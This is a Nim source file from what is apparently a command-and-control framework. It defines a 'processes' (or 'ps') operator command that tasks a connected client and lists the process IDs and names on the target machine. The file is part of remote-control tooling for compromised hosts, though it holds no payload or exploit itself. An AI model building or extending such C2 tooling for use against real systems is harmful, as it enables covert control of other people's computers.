import asyncdispatch, strutils, tables, terminal

import ../../types, ../../communication, ../../logging

import ../../../clientTasks/processes

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let task = await processes.sendTask(server.cli.handlingClient)
  await task.awaitResponse()

  for process in server.cli.handlingClient.processes:
    stdout.styledWriteLine fgGreen, $process.id, "\t", fgDefault, process.name 

let cmd*: Command = Command(
  execProc: execProc,
  name: "processes",
  argsLength: 0,
  aliases: @["ps"],
  usage: @["processes"],
  cliMode: @[ClientInteractMode],
  description: "List processes on target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)